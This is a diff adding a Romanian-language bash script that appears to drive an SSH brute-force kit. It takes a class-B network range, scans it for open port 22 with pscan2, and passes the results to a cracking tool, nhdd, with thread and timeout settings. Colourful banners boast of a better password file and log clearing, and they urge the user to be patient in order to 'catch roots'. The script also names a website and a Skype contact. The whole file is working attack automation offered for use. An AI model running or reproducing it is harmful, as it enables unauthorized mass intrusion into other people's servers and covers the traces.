@@ -1,0 +1,62 @@
+#!/bin/bash
+# Incercam ROOT-uri Paul
+# by Paul 
+# Thanks to Paul
+
+if [ $# != 1 ]; then
+        echo " usage: $0 <b class>"
+        exit;
+fi
+rm -rf scan.log
+BLK='[1;30m'
+RED='[1;31m'
+GRN='[1;32m'
+YEL='[1;33m'
+DBLU='[1;34m'
+MAG='[1;35m'
+CYN='[1;36m'
+WHI='[1;37m'
+DRED='[0;31m'
+DGRN='[0;32m'
+DYEL='[0;33m'
+DBLU='[0;34m'
+DMAG='[0;35m'
+DCYN='[0;36m'
+DWHI='[0;37m'
+RES='[0m'
+sleep 1
+echo "${DRED}>>>>${DGRN}----------------------------------------------------------------${DRED}<<<< "
+echo "${DRED}>>>>${WHI} UPDATE-URI ADUSE ARHIVEI: ${DRED}<<<< "
+echo "${DRED}>>>>${WHI} Viteza Marita. ${DRED}<<<< "
+echo "${DRED}>>>>${WHI} Pass-file mai bun. ${DRED}<<<< "
+echo "${DRED}>>>>${WHI} INCURAND UNAME -A. ${DRED}<<<< "
+echo "${DRED}>>>>${WHI} CLEAR LOG-URI 0. ${DRED}<<<< "
+echo "${DRED}>>>>${DGRN}----------------------------------------------------------------${DRED}<<<< "
+
+
+sleep 2
+echo "${DRED}>>>>${WHI} Bine ai venit acesta este scanner-ul oficial de pe ${WHI}NasaPaul.16mb.com ${DRED}<<<< "
+echo "${DRED}>>>>${WHI} Daca ai nevoie de ajutor ma poti contacta pe skype id-ul este: ${WHI}paul.paul4121 ${DRED}<<<<"
+echo "${DRED}>>>>${WHI} Daca vrei sa fi respectat respecta si tu la rand-ul tau ${DRED}<<<<  "
+echo "${DRED}>>>>${DGRN}----------------------------------------------------------------${DRED}<<<< "
+
+
+
+sleep 3
+././pscan2 $1 22
+sleep 2
+echo " "        
+echo "${DRED}>>>>${DGRN}----------------------------------------------------------------${DRED}<<<< "
+echo "${DRED}>>>>${WHI} Ce ai avea nevoie sa sti ar fi sa  ${DRED}<<<< "
+echo "${DRED}>>>>${WHI} ai rabdare o sa prinzi si root-uri ${DRED}<<<< "
+echo "${DRED}>>>>${DGRN}----------------------------------------------------------------${DRED}<<<<${WHI}"
+
+
+
+sleep 3
+echo " "
+./nhdd scan.log 1 3 5 1500 port 22
+echo "${DRED}>>>>${WHI} Daca ai ajuns pana aici inseamana ca trebuie sa schimbi...${DRED}<<<< "
+echo "${DRED}>>>>${WHI} clasa ca ai terminat scanu-l ${DRED}<<<< "
+sleep 30
+
